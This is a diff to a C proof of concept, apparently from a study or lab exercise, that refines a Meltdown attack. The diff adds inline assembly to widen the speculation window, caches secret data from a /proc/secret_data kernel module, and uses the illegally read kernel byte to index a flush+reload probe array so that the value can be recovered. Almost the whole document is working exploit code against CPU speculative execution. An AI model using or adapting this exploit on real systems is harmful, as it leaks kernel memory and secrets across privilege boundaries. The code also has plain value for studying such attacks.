@@ -1,8 +1,11 @@
 /*
- * ooe.c 
- * Exploit out of order execution to determine if we might be 
- * able to continue execution past an instruction that triggers 
- * an execption (say, for instance, reading kernel memory...)
+ * asm.c 
+ * A further improvement on the previous itertation of the 
+ * attack, this time incorporating inline assembly to utilize 
+ * execution units of the processor while the branch is being speculated. 
+ *
+ * NOTE:
+ * Probability of attack success with this variant remains low. 
  *
  * Kyle Dotterrer
  * December, 2018 
@@ -40,7 +43,7 @@
 void flush_side_channel  (void);
 void reload_side_channel (void); 
 
-void meltdown(unsigned long kernel_data_addr);
+void meltdown_asm(unsigned long kernel_data_addr);
 
 static void catch_segv(); 
 
@@ -60,11 +63,27 @@ int main(void) {
 	// setup signal handler for memory violation 
 	signal(SIGSEGV, catch_segv);
 
+	// open the /proc/secret_data virtual file 
+	// in our kernel module implementation, we allow a user-level process to invoke a function inside of the module
+	// in this case, the function reads the secret data WITHOUT actually leaking it to the user process
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		exit(1); 
+	}
+
+	// however, what it does do it allow us to ensure that the data is cached...
+	int ret = pread(fd, NULL, 0, 0); 
+	if (ret < 0) {
+		perror("pread");
+		exit(1); 
+	}
+
 	// flush the probe array
 	flush_side_channel();
 
 	if (sigsetjmp(jbuf, 1) == 0) {
-		meltdown(KERNEL_ADDR);
+		meltdown_asm(KERNEL_ADDR);
 	} else {
 		printf("memory violation!\n");
 	}
@@ -108,22 +127,31 @@ void reload_side_channel(void) {
 		// what the secret value used to access the array was 
 		if (time2 <= CACHE_HIT_THRESHOLD) {
 			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
-			printf("the secret = %d\n", i);
+			printf("the secret = %c\n", (char) i);
 		}
 	}
 }
 
-void meltdown(unsigned long kernel_data_addr) {
+void meltdown_asm(unsigned long kernel_data_addr) {
 	char kernel_data = 0;
+
+	// give eax something to do while memory access is speculated 
+	asm volatile (
+		".rept 400;"
+		"add $0x141, %%eax;"
+		".endr;"
+
+		:
+		:
+		: "eax"
+	); 
 
 	// operation will cause memory violation
 	kernel_data = *(char *) kernel_data_addr;
 
-	// but will this still execute? 
-	array[7*4096 + DELTA] += 1;
-
-	// have to use the variable so -Wall doesnt complain 
-	printf("got kernel data: %c\n", kernel_data); 
+	// altered from previous example
+	// now we use the kernel data to access the probe array 
+	array[kernel_data*4096 + DELTA] += 1;
 }
 
 static void catch_segv() {
